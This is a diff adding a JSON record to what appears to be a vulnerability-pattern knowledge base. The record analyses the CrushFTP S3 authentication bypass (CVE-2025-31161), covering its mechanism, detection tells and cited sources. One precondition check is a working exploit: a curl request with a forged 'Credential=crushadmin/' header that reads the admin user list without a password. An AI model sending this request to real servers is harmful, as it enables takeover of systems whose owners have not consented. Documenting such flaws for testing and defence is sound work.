@@ -1,0 +1,187 @@
+{
+ "id": "T-0075",
+ "schema_version": 4,
+ "record_version": 1,
+ "title": "The S3-compatible login takes the username from the credential string and then follows a path where the signature is never checked",
+ "index_line": "T-0075 · AUTH_DECISION · AWS4-HMAC Authorization header: username parsed from Credential, signature check skipped → crushadmin · java · corroborated",
+ "langs": {
+  "origin": "java",
+  "transferable": [
+   "java",
+   "dotnet",
+   "node",
+   "php",
+   "python",
+   "ruby"
+  ]
+ },
+ "class": {
+  "cwe": [
+   "CWE-288",
+   "CWE-345",
+   "CWE-306"
+  ],
+  "capec": [],
+  "effect": "AUTH_DECISION",
+  "stage": "impact"
+ },
+ "invariant_violated": "The S3 compatibility layer assumed that a header beginning AWS4-HMAC-SHA256 had already been through signature verification, so it used the Credential field only to name a user; the step that proves the caller holds the secret key was skippable for the header shapes the parser accepted.",
+ "mechanism": [
+  {
+   "n": 1,
+   "primitive": "UNTRUSTED_INPUT",
+   "does": "an unauthenticated request carries `Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/` — no signature, no session cookie"
+  },
+  {
+   "n": 2,
+   "primitive": "PARSE",
+   "does": "the handler trims the header, tests only the AWS4-HMAC prefix, and splits the Credential field on '/' to obtain a user name"
+  },
+  {
+   "n": 3,
+   "primitive": "COMPARE",
+   "does": "the extracted name must be a valid CrushFTP account without a '~'; the default administrator crushadmin qualifies"
+  },
+  {
+   "n": 4,
+   "primitive": "BYPASS",
+   "bypasses": "guard.signature",
+   "does": "for this header shape the flow never reaches HMAC signature evaluation, so no key material or password is required"
+  },
+  {
+   "n": 5,
+   "primitive": "AUTHZ_CHECK",
+   "does": "the request proceeds as the resolved user, so administrative endpoints answer without a password or session"
+  },
+  {
+   "n": 6,
+   "primitive": "INVOKE",
+   "does": "as crushadmin the attacker creates backdoor accounts and uses the file manager, reaching code execution"
+  }
+ ],
+ "slots": {
+  "source.http.header": {
+   "value": "the Authorization header: the S3 Credential field is the only place the user name comes from"
+  },
+  "sink.file.write": {
+   "value": "the administrative session the bypass grants writes server-side users/config and uploads files — the demonstrated impact surface behind the auth decision"
+  },
+  "guard.signature": {
+   "value": "the AWS4-HMAC-SHA256 signature check that the vulnerable flow never evaluates"
+  },
+  "oracle.channel": {
+   "value": "an authenticated admin API response (e.g. getUserList) returned without any cookie or password"
+  }
+ },
+ "preconditions": [
+  {
+   "kind": "reachability",
+   "expr": "the web interface answers over HTTP",
+   "check": {
+    "kind": "shell",
+    "spec": "curl -s -o /dev/null -w '%{http_code}\\n' http://HOST/"
+   }
+  },
+  {
+   "kind": "dependency",
+   "expr": "the build contains the S3 authentication branch that keys on the AWS4-HMAC prefix",
+   "check": {
+    "kind": "grep",
+    "spec": {
+     "patterns": [
+      "AWS4-HMAC|lookup_user_pass|s3_username"
+     ],
+     "paths": [
+      "."
+     ]
+    }
+   }
+  },
+  {
+   "kind": "runtime",
+   "expr": "a bare Credential header is accepted as an authenticated admin request",
+   "check": {
+    "kind": "shell",
+    "spec": "curl -s -H 'Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/' 'http://HOST/WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111' | head -c 400"
+   }
+  }
+ ],
+ "observables": {
+  "success": [
+   "an administrative API returns user/group XML with no cookie and no password",
+   "the response differs from the unauthenticated baseline in a way only an admin session produces"
+  ],
+  "failure_like": [
+   "401/403, or an explicit signature-mismatch error",
+   "the server rejects a user name that carries a '~' but the tester cannot name another account"
+  ],
+  "false_positive": [
+   "a 200 carrying the login page is not a bypass — require an authenticated payload (user list, admin XML)",
+   "a cached or CDN-served admin page is not evidence; compare against a fresh unauthenticated request"
+  ]
+ },
+ "transfer": {
+  "same_effect": [],
+  "hazards": [
+   "every product that speaks an S3-compatible API grows a second authentication path beside its native one",
+   "the tell is credential parsing by string split before any cryptographic verification",
+   "the alternate path usually resolves a principal, so the bypass escalates straight to whatever that principal can do"
+  ],
+  "non_transfers": [
+   "implementations that verify the signature before resolving the principal",
+   "deployments that disable the S3 compatibility listener"
+  ],
+  "confidence": {
+   "java": 0.9,
+   "dotnet": 0.6,
+   "node": 0.6,
+   "php": 0.6,
+   "python": 0.6,
+   "ruby": 0.6
+  }
+ },
+ "combines_with": [],
+ "probes": [],
+ "evidence": {
+  "status": "external_reported",
+  "gate": "external_oracle",
+  "runs": [],
+  "target": "CrushFTP 10 before 10.8.4 / 11 before 11.3.1, S3-compatible authentication path (CVE-2025-31161 / formerly CVE-2025-2825)"
+ },
+ "provenance": [
+  {
+   "src": "sources/486d4b19c409ede7-crushftp-projectdiscovery.txt",
+   "author": "ProjectDiscovery Research",
+   "sha256": "486d4b19c409ede7e133fd31d32f91229b7205a13d4d3539b50f2f0c1588a95f",
+   "corroborates": "CVE-2025-31161 (published as CVE-2025-2825, renumbered; the post states all technical details still apply): the handler only checks that Authorization startsWith \"AWS4-HMAC\", splits the Credential field to obtain the username, and never evaluates the signature in the vulnerable flow"
+  },
+  {
+   "src": "sources/f5d437b4dba97def-crushftp-huntress.txt",
+   "author": "Huntress Labs",
+   "sha256": "f5d437b4dba97def2b130665e7a3e23ea0c2c9e0fd4f6195692fa48fef059b27",
+   "corroborates": "same mechanism described operationally: any CrushFTP user name without a \"~\" in the Credential field, followed by \"/\", is accepted; the currentAuth cookie is not used by the bypass; crushadmin access yields backdoor accounts, file access and code execution"
+  },
+  {
+   "src": "MITRE/NVD CVE-2025-31161 (offline grype DB, synced 2026-11-20)",
+   "author": "MITRE / NIST NVD",
+   "sha256": "",
+   "corroborates": "CVE-2025-31161 description, CVSS and affected ranges"
+  },
+  {
+   "src": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+   "author": "CISA (KEV)",
+   "sha256": "",
+   "corroborates": "actively exploited; KEV added 2025-04-07"
+  }
+ ],
+ "trust": "corroborated",
+ "confidence": {
+  "curator": 0.9
+ },
+ "cost": {
+  "attempts": 0,
+  "wall_min": 0,
+  "noise": "none (offline knowledge)"
+ },
+ "ttl_days": 365
+}
